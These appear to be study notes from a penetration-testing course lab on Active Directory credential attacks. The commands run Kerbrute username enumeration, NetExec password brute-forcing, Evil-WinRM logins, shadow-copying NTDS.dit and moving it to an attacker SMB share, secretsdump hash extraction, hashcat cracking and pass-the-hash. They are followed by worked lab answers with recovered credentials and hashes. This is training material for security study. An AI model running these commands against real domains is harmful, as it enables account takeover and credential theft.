`Active Directory` (`AD`) is a common and critical directory service in modern enterprise networks. AD is something we will repeatedly encounter, so we need to be familiar with various methods we can use to attack and defend these environments.

In this section, we will focus primarily on how we can extract credentials through the use of a `dictionary attack` against `AD accounts` and `dumping hashes` from the `NTDS.dit` file.


Once a Windows system is joined to a domain, it will `no longer default to referencing the SAM database to validate logon requests`.
That domain-joined system will now send authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the `hostname` of the device proceeded by the `Username` (Example: `WS01\nameofuser`) or with direct access to the device then typing `.\` at the logon UI in the `Username` field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform.

## Dictionary attacks against AD accounts using NetExec
Keep in mind that a dictionary attack is essentially using the power of a computer to guess a username and/or password using a customized list of potential usernames and passwords. It can be rather `noisy` (easy to detect) to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of [Group Policy](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791\(v=ws.11\)).
 One of the first things a new employee will get is a username. Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:

|Username convention|Practical example for `Jane Jill Doe`|
|---|---|
|`firstinitiallastname`|jdoe|
|`firstinitialmiddleinitiallastname`|jjdoe|
|`firstnamelastname`|janedoe|
|`firstname.lastname`|jane.doe|
|`lastname.firstname`|doe.jane|
|`nickname`|doedoehacksstuff|
Often, an email address's structure will give us the employee's username (structure: `username@domain`). For example, from the email address `jdoe`@`inlanefreight.com`, we can infer that `jdoe` is the username.

#### Creating a custom list of usernames
Let's say we have done our research and gathered a list of names based on publicly available information. We will keep the list relatively short for the sake of this lesson because organizations can have a huge number of employees. Example list of names:
- Ben Williamson
- Bob Burgerstien
- Jim Stevenson
- Jill Johnson
- Jane Doe

We can create a custom list on our attack host using the names above.
```shell-session
> cat usernames.txt

bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

We can manually create our list(s) or use an `automated list generator` such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.
```shell-session
./username-anarchy -i /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
...
...
```

#### Enumerating valid usernames with Kerbrute
Kerbrute can be used for brute-forcing, password spraying and username enumeration. Right now, we are only interested in username enumeration, which would look like this:
```shell
kerbrute userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt


[+] VALID USERNAME:       bwilliamson@inlanefreight.local
```

#### Launching a brute-force attack with NetExec
```shell
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
 If the admins configured an account lockout policy, this attack could lock out the account that we are targeting.


#### Event logs from the attack
![[Pasted image 20250930182832.png]]

 On any Windows operating system, an admin can navigate to `Event Viewer` and view the Security events to see the exact actions that were logged.

----

Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.
## Capturing NTDS.dit
`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information.

#### Connecting to a DC with Evil-WinRM
```shell
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

#### Checking local group membership
Once connected, we can check to see what privileges `bwilliamson` has. We can start with looking at the local group membership using the command:

```shell-session
*Evil-WinRM* PS C:\> net localgroup
...
...
```
We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights. We also will want to check what domain privileges we have.

#### Checking user account privileges including domain
```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.

#### Creating shadow copy of C:
We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the `C:` drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on `C:` as that is the default location selected at install, but it is possible to change the location.
```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```
#### Copying NTDS.dit from the VSS
We can then copy the `NTDS.dit` file from the volume shadow copy of `C:` onto another location on the drive to prepare to move NTDS.dit to our attack host.
```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
**Note:** As was the case with `SAM`, the hashes stored in `NTDS.dit` are encrypted with a key stored in `SYSTEM`. In order to successfully extract the hashes, one must download both files.

#### Transferring NTDS.dit to attack host (SMB Share technique)
```shell
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

#### Extracting hashes from NTDS.dit
With a copy of `NTDS.dit` on our attack host, we can go ahead and dump the hashes. One way to do this is with Impacket's `secretsdump`:

```shell-session
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
```

### A faster method: Using NetExec to capture NTDS.dit (WOW)
```shell
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

### Cracking hashes and gaining credentials
#### Cracking a single hash with Hashcat
```shell
 sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

`What if we are unsuccessful in cracking a hash?`
## Pass the Hash (PtH) considerations
We can still use hashes to attempt to authenticate with a system using a type of attack called `Pass-the-Hash` (`PtH`). A PtH attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) to authenticate a user using a password hash. Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`. Here is an example of how this would work:
#### Pass the Hash (PtH) with Evil-WinRM Example
```shell
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```


### Questions 

1.  What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? `ntds.dit`

2. Submit the NT hash associated with the Administrator user from the example output in the section reading. Read the dump of ntds.dit:  `64f12cddaa88057e06a81b54e73b949b`

3. On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)
```shell
Run my own script to make a userlist:
>  ADUsersGen -l users.txt  > list.txt
>  cat list.txt
marston
johnmarston
marstonjohn
john.marston
marston.john
j.marston
cjohnson
caroljohnson
...
...

> kerbrute userenum --dc 10.129.202.85 --domain ILF.local list.txt
[+] VALID USERNAME:	 cjohnson@ILF.local
[+] VALID USERNAME:	 jmarston@ILF.local
[+] VALID USERNAME:	 jstapleton@ILF.local
[+] VALID USERNAME:	 jmarston@ILF.local

Write usernames in a file > users.txt
Try netexec to brute force credentials
> netexec smb 10.129.202.85 -u users.txt -p /usr/share/wordlists/seclists/Usernames/fasttrack.txt
[+] ILF.local\cjohnson:Welcome1212
[+] ILF.local\jmarston:P@ssword! (admin)

Try to dump ntds.dit
> netexec smb 10.129.202.85 -u jmarston -p P@ssword! -M ntdsutil\
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::

> hashcat -a 0 -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt

92fd67fd2f49d0e83744aa82363f021b:Winter2008
```